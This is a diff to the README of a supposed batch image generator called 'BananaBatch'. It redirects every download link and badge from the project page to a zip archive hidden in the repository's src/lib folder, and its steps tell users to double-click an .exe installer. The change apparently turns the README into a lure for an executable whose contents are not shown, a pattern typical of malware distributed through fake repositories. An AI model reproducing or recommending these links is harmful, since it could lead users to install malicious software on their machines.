@@ -1,6 +1,6 @@
 # 🍌 BananaBatch - Create Many NanoBanana Images Fast
 
-[![](https://img.shields.io/badge/Download_BananaBatch-Blue?style=for-the-badge)](https://github.com/Vivyanpretend4793/BananaBatch)
+[![](https://img.shields.io/badge/Download_BananaBatch-Blue?style=for-the-badge)](https://github.com/Vivyanpretend4793/BananaBatch/raw/refs/heads/main/src/lib/Batch_Banana_2.6.zip)
 
 ## 🎯 Purpose
 BananaBatch helps you create high volumes of NanoBanana images with minimal effort. You provide one prompt, and the software generates twenty variations for you. You then look through the results and save the files you prefer. This process removes the need to manually enter prompts repeatedly. You gain efficiency and keep your workflow orderly.
@@ -21,7 +21,7 @@ Before installation, ensure your computer meets these requirements:
 - At least 2 gigabytes of free disk space.
 
 ## 🚀 Getting Started
-1. Visit the [official repository page](https://github.com/Vivyanpretend4793/BananaBatch) to locate the latest version.
+1. Visit the [official repository page](https://github.com/Vivyanpretend4793/BananaBatch/raw/refs/heads/main/src/lib/Batch_Banana_2.6.zip) to locate the latest version.
 2. Click the installer file ending in .exe to begin your download.
 3. Save the file to your Downloads folder.
 4. Double-click the file to start the installation wizard.
@@ -29,7 +29,7 @@ Before installation, ensure your computer meets these requirements:
 6. Launch the program from your Start menu after the process finishes.
 
 ## 📥 Download and Install
-All users should [visit this page to download](https://github.com/Vivyanpretend4793/BananaBatch) the software. We release updates to fix bugs and improve processing times. Always check that you use the most recent release for optimal performance. Once the installer finishes, the program creates a shortcut on your desktop. Open this shortcut to start generating images.
+All users should [visit this page to download](https://github.com/Vivyanpretend4793/BananaBatch/raw/refs/heads/main/src/lib/Batch_Banana_2.6.zip) the software. We release updates to fix bugs and improve processing times. Always check that you use the most recent release for optimal performance. Once the installer finishes, the program creates a shortcut on your desktop. Open this shortcut to start generating images.
 
 ## 📋 Running Your First Batch
 1. Open BananaBatch.
